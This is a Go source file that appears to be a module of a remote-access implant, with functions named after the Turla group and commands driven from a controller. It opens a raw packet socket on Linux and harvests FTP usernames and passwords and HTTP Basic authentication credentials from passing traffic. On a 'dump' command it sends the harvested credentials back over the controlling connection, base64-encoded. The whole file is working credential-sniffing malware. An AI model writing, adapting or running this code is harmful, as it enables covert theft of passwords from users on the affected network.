//go:build withsniffer

package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

const hasSniffer = true

type sniffedCred struct {
	Proto string
	User  string
	Pass  string
	Host  string
	Time  time.Time
}

var (
	turlaCredBuf []sniffedCred
	turlaCredMu  sync.Mutex
	snifferFd    int = -1
	snifferStop  chan struct{}
	snifferMu    sync.Mutex
)

func htons(h uint16) uint16 {
	return (h<<8)&0xff00 | (h>>8)&0x00ff
}

// turlaSnifferStart creates an AF_PACKET raw socket on Linux and parses network packets.
func turlaSnifferStart(conn net.Conn, iface string) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("raw sniffer is only supported on Linux")
	}

	snifferMu.Lock()
	if snifferFd >= 0 {
		snifferMu.Unlock()
		return fmt.Errorf("sniffer is already running")
	}

	// ETH_P_ALL = 0x0003, ETH_P_IP = 0x0800
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0800)))
	if err != nil {
		snifferMu.Unlock()
		return fmt.Errorf("raw socket creation failed: %v", err)
	}

	if iface != "" {
		ifi, err := net.InterfaceByName(iface)
		if err == nil {
			sll := &syscall.SockaddrLinklayer{
				Protocol: htons(0x0800),
				Ifindex:  ifi.Index,
			}
			syscall.Bind(fd, sll)
		}
	}

	snifferFd = fd
	snifferStop = make(chan struct{})
	snifferMu.Unlock()

	deoxys("turlaSnifferStart: Raw sniffer started on interface: %s", iface)
	conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "Raw packet sniffer started")))

	guardedGo("raw_sniffer", func() {
		buf := make([]byte, 65535)
		for {
			select {
			case <-snifferStop:
				return
			default:
				n, _, err := syscall.Recvfrom(fd, buf, 0)
				if err != nil {
					if n < 0 {
						return
					}
					continue
				}
				if n > 14+20 { // Min Ethernet (14) + IP (20) header
					parsePacket(buf[:n])
				}
			}
		}
	})

	return nil
}

func parsePacket(pkt []byte) {
	// Simple Ethernet + IP + TCP/UDP parser
	ethHeadLen := 14
	ipPkt := pkt[ethHeadLen:]
	if len(ipPkt) < 20 {
		return
	}
	ipHeadLen := int(ipPkt[0]&0x0f) * 4
	proto := ipPkt[9]

	if proto != 6 || len(ipPkt) < ipHeadLen+20 { // TCP protocol = 6
		return
	}

	tcpPkt := ipPkt[ipHeadLen:]
	srcPort := (uint16(tcpPkt[0]) << 8) | uint16(tcpPkt[1])
	dstPort := (uint16(tcpPkt[2]) << 8) | uint16(tcpPkt[3])
	dataOffset := int((tcpPkt[12] >> 4) & 0x0f) * 4

	if len(tcpPkt) <= dataOffset {
		return
	}
	payload := string(tcpPkt[dataOffset:])

	srcIP := net.IP(ipPkt[12:16]).String()
	dstIP := net.IP(ipPkt[16:20]).String()

	// FTP (Port 21)
	if dstPort == 21 || srcPort == 21 {
		if strings.HasPrefix(payload, "USER ") {
			user := strings.TrimSpace(strings.TrimPrefix(payload, "USER "))
			addCred("FTP", user, "", dstIP)
		} else if strings.HasPrefix(payload, "PASS ") {
			pass := strings.TrimSpace(strings.TrimPrefix(payload, "PASS "))
			addCred("FTP", "", pass, dstIP)
		}
	}

	// HTTP (Port 80 / 8080)
	if dstPort == 80 || dstPort == 8080 {
		if strings.Contains(payload, "Authorization: Basic ") {
			idx := strings.Index(payload, "Authorization: Basic ")
			rest := payload[idx+21:]
			if end := strings.Index(rest, "\r\n"); end > 0 {
				b64 := rest[:end]
				decoded, err := base64.StdEncoding.DecodeString(b64)
				if err == nil && strings.Contains(string(decoded), ":") {
					parts := strings.SplitN(string(decoded), ":", 2)
					addCred("HTTP-Basic", parts[0], parts[1], dstIP)
				}
			}
		}
	}
}

func addCred(proto, user, pass, host string) {
	turlaCredMu.Lock()
	defer turlaCredMu.Unlock()
	// Merge or append
	if len(turlaCredBuf) > 0 && turlaCredBuf[len(turlaCredBuf)-1].Host == host {
		if user != "" && turlaCredBuf[len(turlaCredBuf)-1].User == "" {
			turlaCredBuf[len(turlaCredBuf)-1].User = user
			return
		}
		if pass != "" && turlaCredBuf[len(turlaCredBuf)-1].Pass == "" {
			turlaCredBuf[len(turlaCredBuf)-1].Pass = pass
			return
		}
	}
	turlaCredBuf = append(turlaCredBuf, sniffedCred{
		Proto: proto,
		User:  user,
		Pass:  pass,
		Host:  host,
		Time:  time.Now(),
	})
	deoxys("addCred: Captured %s cred for %s", proto, host)
}

func turlaSnifferStop() {
	snifferMu.Lock()
	defer snifferMu.Unlock()
	if snifferFd >= 0 {
		close(snifferStop)
		syscall.Close(snifferFd)
		snifferFd = -1
		deoxys("turlaSnifferStop: Sniffer stopped")
	}
}

func turlaSnifferDump(conn net.Conn) {
	turlaCredMu.Lock()
	defer turlaCredMu.Unlock()

	if len(turlaCredBuf) == 0 {
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "No captured credentials")))
		return
	}

	var sb strings.Builder
	sb.WriteString("Captured Credentials:\n")
	for _, c := range turlaCredBuf {
		sb.WriteString(fmt.Sprintf("[%s] %s -> Host: %s | User: %s | Pass: %s\n",
			c.Time.Format("15:04:05"), c.Proto, c.Host, c.User, c.Pass))
	}

	encoded := base64.StdEncoding.EncodeToString([]byte(sb.String()))
	conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
}

func dispatchSniffer(conn net.Conn, cmd string, fields []string) error {
	if len(fields) < 2 {
		return fmt.Errorf("usage: !sniffer start [iface] | stop | dump")
	}
	switch fields[1] {
	case "start":
		iface := ""
		if len(fields) >= 3 {
			iface = fields[2]
		}
		return turlaSnifferStart(conn, iface)
	case "stop":
		turlaSnifferStop()
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "Sniffer stopped")))
		return nil
	case "dump":
		turlaSnifferDump(conn)
		return nil
	default:
		return fmt.Errorf("usage: !sniffer start [iface] | stop | dump")
	}
}
